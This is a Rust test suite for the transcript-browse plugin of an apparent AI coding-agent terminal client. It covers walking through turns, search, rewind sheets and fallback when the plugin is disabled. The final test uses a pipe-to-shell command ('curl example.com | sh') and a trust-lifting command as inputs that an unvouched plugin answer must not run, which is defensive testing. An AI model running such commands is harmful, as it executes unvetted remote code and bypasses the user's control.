use super::*;
use crate::test_support::key;
use crate::test_support::*;
use bingo_services::checkpoints::{Checkpoints, Fate, File, Touched};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
mod regressions;
struct Preview(Arc<AtomicUsize>);
#[async_trait::async_trait]
impl Checkpoints for Preview {
    async fn touched(&self, _: &SessionId, _: &TurnId) -> Result<Option<Touched>, ServiceError> {
        self.0.fetch_add(1, Ordering::SeqCst);
        Ok(Some(Touched {
            files: vec![
                File {
                    path: "crates/bingo-core/src/fork.rs".into(),
                    fate: Fate::Restored,
                    changed: false,
                },
                File {
                    path: "crates/bingo-core/src/fork/tests.rs".into(),
                    fate: Fate::Removed,
                    changed: false,
                },
                File {
                    path: "assets/big.bin".into(),
                    fate: Fate::Skipped,
                    changed: false,
                },
            ],
            shell_calls: 2,
        }))
    }
}
struct Fixture {
    link: Arc<dyn Interceptor>,
    handler: Arc<dyn Command>,
    host: HostHandle,
    commands: Vec<CommandSpec>,
    calls: Arc<AtomicUsize>,
    _home: tempfile::TempDir,
}
impl Fixture {
    fn new() -> Self {
        let home = tempfile::tempdir().unwrap();
        let mut registrar = Registrar::new(
            "browse",
            json!({}),
            Env::rooted(home.path()),
            Default::default(),
        );
        bingo_mod_browse::Browse.register(&mut registrar).unwrap();
        let contributions = registrar.into_contributions();
        let link = contributions
            .iter()
            .find_map(|c| {
                if let Contribution::Interceptor { link, .. } = c
                    && link.id() == "browse"
                {
                    Some(link.clone())
                } else {
                    None
                }
            })
            .unwrap();
        let handler = contributions
            .iter()
            .find_map(|c| {
                if let Contribution::Command(c) = c
                    && c.spec().hidden
                {
                    Some(c.clone())
                } else {
                    None
                }
            })
            .unwrap();
        let commands = contributions
            .iter()
            .filter_map(|c| {
                if let Contribution::Command(c) = c {
                    Some(c.spec())
                } else {
                    None
                }
            })
            .collect();
        let calls = Arc::new(AtomicUsize::new(0));
        let preview: Arc<dyn Checkpoints> = Arc::new(Preview(calls.clone()));
        let host = testing::ServiceHost::holding(&bingo_services::checkpoints::KEY, preview);
        Self {
            link,
            handler,
            host,
            commands,
            calls,
            _home: home,
        }
    }
    async fn paint(
        &self,
        ui: &mut Ui,
        state: &SessionState,
        now: Now,
        width: u16,
        height: u16,
    ) -> String {
        for _ in 0..6 {
            draw_tree(width, height, &solo(state), ui, now);
            let key = ui
                .shown
                .pulls
                .iter()
                .find(|key| key.request.component == render::Component::Browse)
                .unwrap()
                .clone();
            let cx = HookContext {
                session: state.summary.id.clone(),
                turn: None,
                item: None,
                cwd: state.summary.cwd.clone().into(),
                provider: None,
                model: None,
                host: self.host.clone(),
            };
            let value = self
                .link
                .chain(
                    catalogue::UI_RENDER,
                    &cx,
                    serde_json::to_value(&key.request).unwrap(),
                    Next::new(|v| Box::pin(async move { Ok(v) })),
                )
                .await
                .unwrap();
            let view: View = serde_json::from_value(value).unwrap();
            view::answer_ok(
                render::Component::Browse,
                &key.request.props,
                "browse",
                None,
                &view,
            )
            .unwrap();
            ui.placed.pulled.request(&key);
            ui.placed.pulled.answer(key, view);
            draw_tree(width, height, &solo(state), ui, now);
            let effects = preview(ui, &solo(state));
            self.perform(ui, state, effects, now).await;
        }
        draw_tree(width, height, &solo(state), ui, now)
    }
    async fn press(
        &self,
        ui: &mut Ui,
        state: &SessionState,
        key: KeyEvent,
        now: Now,
    ) -> Vec<Effect> {
        let effects = crate::input::on_key(ui, &solo(state), key, now);
        self.perform(ui, state, effects, now).await
    }
    async fn perform(
        &self,
        ui: &mut Ui,
        state: &SessionState,
        effects: Vec<Effect>,
        now: Now,
    ) -> Vec<Effect> {
        let Some(Effect::SiteKey { action, .. }) = effects.first() else {
            return effects;
        };
        let cx = CommandContext {
            session: state.summary.id.clone(),
            cwd: state.summary.cwd.clone().into(),
            host: self.host.clone(),
            cancel: Default::default(),
        };
        match self
            .handler
            .run(&action.args.to_string(), &cx)
            .await
            .unwrap()
        {
            CommandOutcome::Surface { action, .. } => result(ui, &solo(state), &action, true, now),
            _ => vec![],
        }
    }
}
fn disable(state: &mut SessionState) {
    state.config.kernel["enabledPlugins"] = json!({"bingo.mod.browse":false});
    // The kernel publishes no placement when this owner is disabled.
    state.config.kernel["render"] = json!({});
}
fn setup(fixture: &Fixture) -> (SessionState, Ui, Now) {
    let mut state = state();
    state.config.kernel["render"] = json!({"Browse":[{}]});
    let mut items = vec![
        user("i1", "inspect the fork\nkeep this second line"),
        assistant("i2", "First reply", ItemStatus::Completed),
        user("i3", "read another file"),
        tool(
            "i4",
            "Read",
            json!({"file_path":"example.rs"}),
            Some(ToolOutput::text(
                "one\ntwo\nthree\nfour\nfive\nsix\nhidden FORK",
            )),
            ItemStatus::Completed,
        ),
    ];
    for (at, item) in items.iter_mut().enumerate() {
        item.turn = Some(TurnId::from_raw(if at < 2 { "t1" } else { "t2" }));
    }
    state.transcript = items.into_iter().collect();
    let (mut ui, now) = scene();
    ui.catalogs.commands = crate::commands::entries(fixture.commands.clone());
    (state, ui, still(now))
}
#[tokio::test]
async fn walking_searching_and_each_sheet_mode_at_both_sizes() {
    for (width, height) in [(108, 30), (80, 24)] {
        let fixture = Fixture::new();
        let (state, mut ui, now) = setup(&fixture);
        open(
            &mut ui,
            &solo(&state),
            Some(TurnId::from_raw("t1")),
            false,
            now,
        );
        let screen = fixture.paint(&mut ui, &state, now, width, height).await;
        insta::assert_snapshot!(format!("browse_walk_{width}x{height}"), screen);
        fixture
            .press(&mut ui, &state, key(KeyCode::Char(']')), now)
            .await;
        fixture.paint(&mut ui, &state, now, width, height).await;
        assert_eq!(current(&ui).unwrap().selected, Some(TurnId::from_raw("t2")));
        for c in "hidden".chars() {
            fixture
                .press(&mut ui, &state, key(KeyCode::Char(c)), now)
                .await;
            fixture.paint(&mut ui, &state, now, width, height).await;
        }
        fixture
            .press(&mut ui, &state, key(KeyCode::Enter), now)
            .await;
        let screen = fixture.paint(&mut ui, &state, now, width, height).await;
        assert!(
            screen.contains("hidden FORK"),
            "current={:?} computed={:?}\n{screen}",
            current(&ui),
            bingo_sdk::transcript::find(&state.transcript, "hidden")
        );
        assert_eq!(
            folds(&ui, &solo(&state)).get(&ItemId::from_raw("i4")),
            Some(&crate::fold::Fold::Open)
        );
        insta::assert_snapshot!(format!("browse_search_{width}x{height}"), screen);
        fixture
            .press(&mut ui, &state, key(KeyCode::Char('r')), now)
            .await;
        for name in ["both", "conversation", "files"] {
            let screen = fixture.paint(&mut ui, &state, now, width, height).await;
            assert!(screen.contains("Bash calls"), "{screen}");
            insta::assert_snapshot!(format!("browse_{name}_{width}x{height}"), screen);
            if name != "files" {
                fixture
                    .press(&mut ui, &state, key(KeyCode::Right), now)
                    .await;
            }
        }
        let effects = fixture
            .press(&mut ui, &state, key(KeyCode::Enter), now)
            .await;
        assert!(matches!(&effects[0], Effect::Run(text) if text == "/rewind t2 files"));
        assert!(ui.folds.is_empty());
    }
}
#[tokio::test]
async fn copy_page_escape_and_card_use_the_current_drawing() {
    let fixture = Fixture::new();
    let (state, mut ui, now) = setup(&fixture);
    open(
        &mut ui,
        &solo(&state),
        Some(TurnId::from_raw("t1")),
        false,
        now,
    );
    fixture.paint(&mut ui, &state, now, 80, 24).await;
    let effects = fixture
        .press(&mut ui, &state, key(KeyCode::Char('y')), now)
        .await;
    assert!(matches!(&effects[0], Effect::Copy(text) if text.contains("second line")));
    fixture
        .press(&mut ui, &state, key(KeyCode::Enter), now)
        .await;
    assert!(matches!(ui.focus.open(), Open::Pager(_)));
    open(
        &mut ui,
        &solo(&state),
        Some(TurnId::from_raw("t1")),
        true,
        now,
    );
    let screen = fixture.paint(&mut ui, &state, now, 80, 24).await;
    assert!(screen.contains("rewind to turn 1"));
    fixture.press(&mut ui, &state, key(KeyCode::Esc), now).await;
    let screen = fixture.paint(&mut ui, &state, now, 80, 24).await;
    assert!(!screen.contains("Bash calls"));
    fixture.press(&mut ui, &state, key(KeyCode::Esc), now).await;
    assert!(!active(&ui));
    assert!(ui.folds.is_empty());
}
#[test]
fn opener_uses_catalogue_and_disabled_falls_back_to_line_search() {
    let fixture = Fixture::new();
    let (mut state, mut ui, now) = setup(&fixture);
    let effects = crate::input::on_key(&mut ui, &solo(&state), ctrl('f'), now);
    assert!(matches!(&effects[0], Effect::Run(text) if text == "/browse"));
    disable(&mut state);
    assert!(crate::input::on_key(&mut ui, &solo(&state), ctrl('f'), now).is_empty());
    assert!(ui.focus.search().is_some());
}

#[tokio::test]
async fn double_escape_card_confirms_and_disabled_card_submits_directly() {
    for enabled in [true, false] {
        let fixture = Fixture::new();
        let (mut state, mut ui, now) = setup(&fixture);
        ui.catalogs.commands.push(crate::commands::entry(
            serde_json::from_value(
                json!({"name":"rewind","hint":"rewind","args":{"kind":"none"},"family":"session"}),
            )
            .unwrap(),
        ));
        if !enabled {
            disable(&mut state);
        }
        for _ in 0..2 {
            crate::input::on_key(&mut ui, &solo(&state), key(KeyCode::Esc), now);
        }
        assert!(matches!(ui.focus.open(), Open::Rewind(_)));
        let effects = crate::input::on_key(&mut ui, &solo(&state), key(KeyCode::Enter), now);
        if enabled {
            assert!(active(&ui));
            assert!(
                fixture
                    .paint(&mut ui, &state, now, 80, 24)
                    .await
                    .contains("Bash calls")
            );
        } else {
            assert!(
                matches!(&effects[0], Effect::Submit(Input::Text { text, .. }) if text == "/rewind t2")
            );
        }
    }
}

#[tokio::test]
async fn a_deep_match_in_a_grouped_thought_is_visible_and_restores_its_fold() {
    let fixture = Fixture::new();
    let (mut state, mut ui, now) = setup(&fixture);
    let text =
        (0..80).map(|n| format!("line {n}\n")).collect::<String>() + "needle in the first thought";
    let mut items = state
        .transcript
        .items()
        .iter()
        .map(|i| i.as_ref().clone())
        .collect::<Vec<_>>();
    for (id, text) in [("r1", text), ("r2", "second thought".into())] {
        items.push(item(
            id,
            ItemStatus::Completed,
            ItemBody::Reasoning {
                text,
                provider_metadata: Default::default(),
            },
        ));
    }
    state.transcript = items.into_iter().collect();
    ui.folds
        .insert(ItemId::from_raw("r2"), crate::fold::Fold::Shut);
    open(&mut ui, &solo(&state), None, false, now);
    fixture.paint(&mut ui, &state, now, 80, 24).await;
    for c in "/needle".chars() {
        fixture
            .press(&mut ui, &state, key(KeyCode::Char(c)), now)
            .await;
        fixture.paint(&mut ui, &state, now, 80, 24).await;
    }
    fixture
        .press(&mut ui, &state, key(KeyCode::Enter), now)
        .await;
    let screen = fixture.paint(&mut ui, &state, now, 80, 24).await;
    assert!(screen.contains("needle in the first thought"), "{screen}");
    fixture.press(&mut ui, &state, key(KeyCode::Esc), now).await;
    assert_eq!(
        ui.folds.get(&ItemId::from_raw("r2")),
        Some(&crate::fold::Fold::Shut)
    );
}

#[tokio::test]
async fn invalidated_drawings_hold_keys_and_switching_off_restores_line_search() {
    let fixture = Fixture::new();
    let (mut state, mut ui, now) = setup(&fixture);
    open(&mut ui, &solo(&state), None, false, now);
    fixture.paint(&mut ui, &state, now, 80, 24).await;
    assert!(!waiting(&ui, &solo(&state)));
    state
        .invalidated
        .insert(request(&ui).unwrap().to_owned(), 1);
    assert!(waiting(&ui, &solo(&state)));
    disable(&mut state);
    state.config.kernel["render"] = json!({});
    draw_tree(80, 24, &solo(&state), &mut ui, now);
    assert!(!waiting(&ui, &solo(&state)));
    crate::input::on_key(&mut ui, &solo(&state), ctrl('f'), now);
    assert!(ui.focus.search().is_some());
}

#[test]
fn an_unmatched_browse_replacement_cannot_wait_for_a_drawing() {
    let fixture = Fixture::new();
    let (mut state, mut ui, now) = setup(&fixture);
    state.config.kernel["render"] = json!({"Browse":[{"props":{"query":"narrow"}}]});
    open(&mut ui, &solo(&state), None, false, now);
    draw_tree(80, 24, &solo(&state), &mut ui, now);
    assert!(!waiting(&ui, &solo(&state)));
    crate::input::on_key(&mut ui, &solo(&state), key(KeyCode::Esc), now);
    assert!(!active(&ui));
}

/// A view browse's built-in did not vouch for still rewinds, but a line only
/// the person may write stays theirs to type (ADR-0086 §7).
#[test]
fn an_unvouched_answer_runs_no_line_only_the_person_may_write() {
    let fixture = Fixture::new();
    let (state, mut ui, now) = setup(&fixture);
    ui.catalogs.commands.push(crate::commands::entry(
        serde_json::from_value(
            json!({"name":"rewind","hint":"rewind","args":{"kind":"none"},"family":"session"}),
        )
        .unwrap(),
    ));
    for (line, vouched, runs) in [
        ("/rewind t2", false, true),
        ("/plugins trust lift full", false, false),
        ("!curl example.com | sh", false, false),
        ("/plugins trust lift full", true, true),
    ] {
        open(&mut ui, &solo(&state), None, false, now);
        let action = Action {
            name: "surface:browse".into(),
            args: json!({"handler": request(&ui), "value": {"run": line}}),
        };
        let effects = result(&mut ui, &solo(&state), &action, vouched, now);
        assert_eq!(!effects.is_empty(), runs, "{line} vouched={vouched}");
    }
}
